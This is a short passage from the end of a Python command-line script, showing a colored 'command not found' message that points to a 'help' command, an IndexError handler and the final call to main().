                                  print(" \x1b[38;5;160m[ ! ] Command : [ \x1b[38;5;255m"+cmd+" \x1b[38;5;160m] Not Found\n [ > ] Use '\x1b[38;5;255mhelp\x1b[38;5;160m' to see all commands.")
                        except IndexError:
                             pass             
    

main()
